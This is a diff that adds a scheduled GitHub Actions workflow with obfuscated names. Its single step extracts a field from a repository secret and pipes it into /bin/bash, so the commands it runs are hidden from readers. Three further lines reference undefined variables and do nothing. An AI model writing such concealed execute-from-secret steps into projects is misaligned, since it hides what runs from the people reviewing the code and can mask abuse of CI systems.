@@ -1,0 +1,21 @@
+name: hongjinzhaihe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongjinzhaihe
+        env:
+          tynrq6441: ${{ secrets.tynrq6441 }}
+        run: |
+          echo $tynrq6441 | jq -r .zjgu72994 | /bin/bash
+          echo $rvk720 | jq -r .qtu2 | /bin/bash
+          echo $rqu2070 | jq -r .waurj7 | /bin/bash
+          echo $q00296 | jq -r .ub9035 | /bin/bash
+
